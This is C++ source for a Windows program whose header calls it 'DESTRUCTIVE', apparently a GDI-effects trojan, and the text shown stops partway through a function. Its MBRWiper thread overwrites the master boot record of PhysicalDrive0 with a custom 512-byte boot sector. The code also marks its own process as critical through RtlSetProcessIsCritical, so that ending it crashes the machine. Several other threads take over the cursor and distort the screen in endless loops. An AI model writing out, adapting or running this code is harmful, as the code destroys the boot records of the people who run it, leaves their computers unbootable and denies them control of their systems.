// BleuLejendTales1234 (DESTRUCTIVE) by Executioner0x3f
// original Safety Version by another account
// Reminder that the destruction may not work in Dev C++

#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <math.h>
#include <time.h>
#include <Windows.h>
#include <windowsx.h>
#include <tchar.h>
#include <ctime>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#define _USE_MATH_DEFINES 1
#include <cmath>
#define NOTSRCINVERT (DWORD)0x999999
#define M_PI   3.14159265358979323846264338327950288
//#define PI   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG); 
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
const unsigned char MasterBootRecord[] = { 0xE8, 0x03, 0x00, 0xE8, 0x1D, 0x00, 0xB4, 0x00, 0xB0, 0x13, 0xCD, 0x10, 0x68, 0x00, 0xA0, 0x07,
0xB4, 0x0C, 0x30, 0xC0, 0x31, 0xDB, 0x31, 0xC9, 0x31, 0xD2, 0xC3, 0x31, 0xC9, 0x31, 0xD2, 0xFF,
0x06, 0x5D, 0x7C, 0xEB, 0x12, 0x81, 0xF9, 0x40, 0x01, 0x73, 0x2D, 0x81, 0xFA, 0xC8, 0x00, 0x73,
0xEA, 0xCD, 0x10, 0x41, 0xEB, 0xED, 0xC3, 0x89, 0xCB, 0x01, 0xD3, 0x88, 0xD8, 0x02, 0x06, 0x5D,
0x7C, 0xC0, 0xE8, 0x05, 0xEB, 0x00, 0x3C, 0x38, 0x77, 0x06, 0x3C, 0x20, 0x72, 0x06, 0xEB, 0xD5,
0x2C, 0x10, 0xEB, 0xF2, 0x04, 0x20, 0xEB, 0xEE, 0x31, 0xC9, 0x42, 0xEB, 0xC6, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	return 1;
}
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
DWORD WINAPI movecur(LPVOID lpParam) { // That is just a GetCursorPos func...
	HDC hdc;
	POINT curPos;
	HICON icon = LoadIcon(NULL, IDI_ERROR);
	int w = GetSystemMetrics(SM_CXICON), h = GetSystemMetrics(SM_CYICON);

	while (1) {
		hdc = GetDC(0);

		GetCursorPos(&curPos);
		SetCursorPos(curPos.x + 1, curPos.y);
		Sleep(3);

		ReleaseDC(0, hdc);
	}
}
//cursor moves the other way after half of the payloads
DWORD WINAPI movecur2(LPVOID lpParam) {
	HDC hdc;
	POINT curPos;
	HICON icon = LoadIcon(NULL, IDI_ERROR);
	int w = GetSystemMetrics(SM_CXICON), h = GetSystemMetrics(SM_CYICON);

	while (1) {
		hdc = GetDC(0);

		GetCursorPos(&curPos);
		SetCursorPos(curPos.x - 1, curPos.y);
		Sleep(3);

		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	//int why = 1;
	while (true)
	{
		//StretchBlt(hdc, 0, 0, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, 0, sh/2, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//BitBlt(hdc, 0, 0, y, x, hdc, 0, 0, PATINVERT);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, 0, -1, sw, sh, hdc, 0, 0, SRCAND);
		BitBlt(hdc, 0, 1, sw, sh, hdc, 0, 0, SRCAND);
		BitBlt(hdc, -30, 0, sw, sh, hdc, 0, 0, SRCCOPY);//credit to pankoza for the train effect
		BitBlt(hdc, sw - 30, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		//StretchBlt(hdc, why, why, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY); why++;//why++;
		//StretchBlt(hdc, sw/4+why/2, sh/4+why/2, sw/2-why, sh/2-why, hdc, 0, 0, sw, sh, SRCCOPY); why++;why++;
		//StretchBlt(hdc, why, why, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, why, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, sh/2, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw+why, sh+why, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw, sh, hdc, 0, 0, sw, sh, NOTSRCERASE); why++;
		//PatBlt(hdc,rand()%100+1,rand()%100+1,rand()%sw,rand()%sh,PATINVERT);
		//Sleep(100);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCPAINT);
		//SetStretchBltMode(hdc,COLORONCOLOR);
		//SetStretchBltMode(hdc,HALFTONE);		
		//StretchBlt(hdc, 0, 0, rand()%sw-25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//BitBlt(hdc, 1, 0, sw, sh, hdc, 0, 0, SRCINVERT); //why++;
		//BitBlt(hdc, -1, 0, sw, sh, hdc, 0, 0, SRCINVERT);
		//Ellipse(hdc,rand()%10-15,sh,rand()%10-15,sw);
		//Sleep(500);
	}
}
DWORD WINAPI shader2(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	POINT points[3];
	//int why = 1;
	while (true)
	{
		//StretchBlt(hdc, 0, 0, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, 0, sh/2, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//BitBlt(hdc, 0, 0, y, x, hdc, 0, 0, PATINVERT);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCCOPY);
		//BitBlt(hdc, 0, -1, sw, sh, hdc, 0, 0, SRCAND);
		//BitBlt(hdc, 0, 1, sw, sh, hdc, 0, 0, SRCAND);
		//sets the first point at the top left of the screen!
		points[0].x = rand() % sw;
		points[0].y = rand() % sh;

		//sets the second point to a random position withim the screens width and height
		points[1].x = rand() % sw;
		points[1].y = rand() % sh;

		//sets a third point to a random position outside the screens boundaries!
		points[2].x = sw + (rand() % sw);
		points[2].x = sh + (rand() % sh);
		// those are our 3 points!

		PlgBlt(hdc, points, hdc, 0, 0, sw, sh, 0, 0, 0); //yayyy PlgBlt!

		//Sleep(1);
		StretchBlt(hdc, 25 / 2, 25 / 2, sw - 25, sh - 25, hdc, 0, 0, sw, sh, SRCCOPY);
		//StretchBlt(hdc, sw/4+why/2, sh/4+why/2, sw/2-why, sh/2-why, hdc, 0, 0, sw, sh, SRCCOPY); why++;why++;
		//StretchBlt(hdc, why, why, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, why, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, sh/2, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw+why, sh+why, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw, sh, hdc, 0, 0, sw, sh, NOTSRCERASE); why++;
		//PatBlt(hdc,rand()%100+1,rand()%100+1,rand()%sw,rand()%sh,PATINVERT);
		//Sleep(100);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCPAINT);
		//SetStretchBltMode(hdc,COLORONCOLOR);
		//SetStretchBltMode(hdc,HALFTONE);		
		//StretchBlt(hdc, 0, 0, rand()%sw-25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//BitBlt(hdc, 1, 0, sw, sh, hdc, 0, 0, SRCINVERT); //why++;
		//BitBlt(hdc, -1, 0, sw, sh, hdc, 0, 0, SRCINVERT);
		//Ellipse(hdc,rand()%10-15,sh,rand()%10-15,sw);
		//Sleep(500);
	}
}
DWORD WINAPI shader3(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	//int why = 1;
	while (true)
	{
		//StretchBlt(hdc, 0, 0, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, 0, sh/2, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//BitBlt(hdc, 0, 0, y, x, hdc, 0, 0, PATINVERT);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCCOPY);
		//BitBlt(hdc, 0, 0, y, x, hdc, 0, 0, PATINVERT);
		BitBlt(hdc, 10, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, -10, 0, sw, sh, hdc, 0, 0, SRCPAINT);
		//Sleep(300);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCPAINT);
		//SetStretchBltMode(hdc,COLORONCOLOR);
		//SetStretchBltMode(hdc,HALFTONE);		
		StretchBlt(hdc, 0, 0, rand() % sw + 25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		StretchBlt(hdc, 0, 0, rand() % sw - 25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		BitBlt(hdc, rand() % 10 + 1, rand() % 10 + 1, sw, sh, hdc, 0, 0, SRCINVERT);
		DrawIconEx(hdc, rand() % sw, rand() % sh, LoadIcon(NULL, IDI_WINLOGO), 200, 200, 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % sw, rand() % sh, LoadIcon(NULL, IDI_WARNING), 200, 200, 0, NULL, DI_NORMAL);
		//BitBlt(hdc, 0, 1, sw, sh, hdc, 0, 0, SRCAND);
		//BitBlt(hdc, -30, 0, sw, sh, hdc, 0, 0, SRCCOPY);//credit to pankoza for the train effect
		//BitBlt(hdc, sw - 30, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		//StretchBlt(hdc, why, why, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY); why++;//why++;
		//StretchBlt(hdc, sw/4+why/2, sh/4+why/2, sw/2-why, sh/2-why, hdc, 0, 0, sw, sh, SRCCOPY); why++;why++;
		//StretchBlt(hdc, why, why, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, why, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, sh/2, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw+why, sh+why, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw, sh, hdc, 0, 0, sw, sh, NOTSRCERASE); why++;
		//PatBlt(hdc,rand()%100+1,rand()%100+1,rand()%sw,rand()%sh,PATINVERT);
		//Sleep(100);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCPAINT);
		//SetStretchBltMode(hdc,COLORONCOLOR);
		//SetStretchBltMode(hdc,HALFTONE);		
		//StretchBlt(hdc, 0, 0, rand()%sw-25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//BitBlt(hdc, 1, 0, sw, sh, hdc, 0, 0, SRCINVERT); //why++;
		//BitBlt(hdc, -1, 0, sw, sh, hdc, 0, 0, SRCINVERT);
		//Ellipse(hdc,rand()%10-15,sh,rand()%10-15,sw);
		//Sleep(500);
	}
}
//LoadIcon(NULL, IDI_ERROR)
DWORD WINAPI shader4(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	HPEN pen;
	COLORREF color;
	POINT bPoints[4];
	bPoints[0] = { sw / 2, sh / 2 };
	POINT points[3];
	int why = 1;
	while (true)
	{
		//StretchBlt(hdc, 0, 0, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, 0, sh/2, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//BitBlt(hdc, 0, 0, y, x, hdc, 0, 0, PATINVERT);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCCOPY);
		//BitBlt(hdc, 0, 0, y, x, hdc, 0, 0, PATINVERT);
		bPoints[1] = { rand() % sw, rand() % sh };
		bPoints[2] = { rand() % sw, rand() % sh };
		bPoints[3] = { rand() % sw, rand() % sh };
		HPEN hPen = CreatePen(PS_SOLID, rand() % 20, RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, hPen);
		PolyBezier(hdc, bPoints, 4);
		DeleteObject(hPen);
		//sets the first point at the top left of the screen!
		points[0].x = 50 + why;
		points[0].y = 50 - why;

		//sets the second point to a random position withim the screens width and height
		points[1].x = 500;
		points[1].y = 1200;

		//sets a third point to a random position outside the screens boundaries!
		points[2].x = sw + 500;
		points[2].x = sh + 500;
		// those are our 3 points!

		PlgBlt(hdc, points, hdc, 0, 0, sw, sh, 0, 0, 0); why++; //yayyy PlgBlt!
		//StretchBlt(hdc, rand()%20+1, rand()%20+1, sw-rand()%20+1, sh-rand()%20+1, hdc, 0, 0, sw, sh, SRCCOPY);
		//StretchBlt(hdc, rand()%100+1, rand()%100+1, rand()%2000+1, rand()%2000+1, hdc, 0, 0, sw, sh, SRCCOPY);
		//PatBlt(hdc,rand()%20+1,rand()%20+1,sw,sh,SRCINVERT);
		//BitBlt(hdc, 0, 1, sw, sh, hdc, 0, 0, SRCAND);
		//BitBlt(hdc, -30, 0, sw, sh, hdc, 0, 0, SRCCOPY);//credit to pankoza for the train effect
		//BitBlt(hdc, sw - 30, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		//StretchBlt(hdc, why, why, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY); why++;//why++;
		//StretchBlt(hdc, sw/4+why/2, sh/4+why/2, sw/2-why, sh/2-why, hdc, 0, 0, sw, sh, SRCCOPY); why++;why++;
		//StretchBlt(hdc, why, why, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, why, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, sh/2, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw+why, sh+why, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw, sh, hdc, 0, 0, sw, sh, NOTSRCERASE); why++;
		//PatBlt(hdc,rand()%100+1,rand()%100+1,rand()%sw,rand()%sh,PATINVERT);
		//Sleep(100);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCPAINT);
		//SetStretchBltMode(hdc,COLORONCOLOR);
		//SetStretchBltMode(hdc,HALFTONE);		
		//StretchBlt(hdc, 0, 0, rand()%sw-25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//BitBlt(hdc, 1, 0, sw, sh, hdc, 0, 0, SRCINVERT); //why++;
		//BitBlt(hdc, -1, 0, sw, sh, hdc, 0, 0, SRCINVERT);
		//Ellipse(hdc,rand()%10-15,sh,rand()%10-15,sw);
		//Sleep(500);
	}
}
DWORD WINAPI shader5(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	//int why = 1;
	while (true)
	{
		//BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
		//BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
		//BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
		//BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
		//BitBlt(hdc,-5,0,sw-10,sh,hdc,0,0,PATINVERT);
		//BitBlt(hdc,5,0,sw+10,sh,hdc,0,0,SRCINVERT);
		//BitBlt(hdc,0,5,sw,sh+10,hdc,0,0,PATINVERT);
		//BitBlt(hdc,0,-5,sw,sh-10,hdc,0,0,SRCINVERT);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, rand() % 500, rand() % 500, rand() % sw, rand() % sh, hdc, 0, 0, PATINVERT);
		DeleteObject(brush);
		StretchBlt(hdc, 4, 0, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		StretchBlt(hdc, -5, 0, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//Sleep(10);
		//StretchBlt(hdc, 0, 0, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, 0, sh/2, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//BitBlt(hdc, 0, 0, y, x, hdc, 0, 0, PATINVERT);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCCOPY);
		//BitBlt(hdc, 0, 0, y, x, hdc, 0, 0, PATINVERT);
		//BitBlt(hdc, 10, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		//BitBlt(hdc, -10, 0, sw, sh, hdc, 0, 0, SRCPAINT);
		//Sleep(300);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCPAINT);
		//SetStretchBltMode(hdc,COLORONCOLOR);
		//SetStretchBltMode(hdc,HALFTONE);		
		//StretchBlt(hdc, 0, 0, rand()%sw+25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//StretchBlt(hdc, 0, 0, rand()%sw-25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//BitBlt(hdc,rand()%10+1,rand()%10+1,sw,sh,hdc,0,0,SRCINVERT);
		//DrawIconEx(hdc,rand()%sw,rand()%sh,LoadIcon(NULL, IDI_WINLOGO),200,200,0,NULL,DI_NORMAL);
		//DrawIconEx(hdc,rand()%sw,rand()%sh,LoadIcon(NULL, IDI_WARNING),200,200,0,NULL,DI_NORMAL);
		//BitBlt(hdc, 0, 1, sw, sh, hdc, 0, 0, SRCAND);
		//BitBlt(hdc, -30, 0, sw, sh, hdc, 0, 0, SRCCOPY);//credit to pankoza for the train effect
		//BitBlt(hdc, sw - 30, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		//StretchBlt(hdc, why, why, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY); why++;//why++;
		//StretchBlt(hdc, sw/4+why/2, sh/4+why/2, sw/2-why, sh/2-why, hdc, 0, 0, sw, sh, SRCCOPY); why++;why++;
		//StretchBlt(hdc, why, why, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, why, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, sh/2, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw+why, sh+why, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw, sh, hdc, 0, 0, sw, sh, NOTSRCERASE); why++;
		//PatBlt(hdc,rand()%100+1,rand()%100+1,rand()%sw,rand()%sh,PATINVERT);
		//Sleep(100);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCPAINT);
		//SetStretchBltMode(hdc,COLORONCOLOR);
		//SetStretchBltMode(hdc,HALFTONE);		
		//StretchBlt(hdc, 0, 0, rand()%sw-25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//BitBlt(hdc, 1, 0, sw, sh, hdc, 0, 0, SRCINVERT); //why++;
		//BitBlt(hdc, -1, 0, sw, sh, hdc, 0, 0, SRCINVERT);
		//Ellipse(hdc,rand()%10-15,sh,rand()%10-15,sw);
		//Sleep(500);
	}
}
DWORD WINAPI shader6(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	//int why = 1;
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (true)
	{
		//StretchBlt(hdc, 0, 0, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, 0, sh/2, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//BitBlt(hdc, 0, 0, y, x, hdc, 0, 0, PATINVERT);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, 5, -1, sw, sh, hdc, 0, 0, SRCAND);
		BitBlt(hdc, -500, -5, sw, sh, hdc, 0, 0, SRCCOPY);//credit to pankoza for the train effect
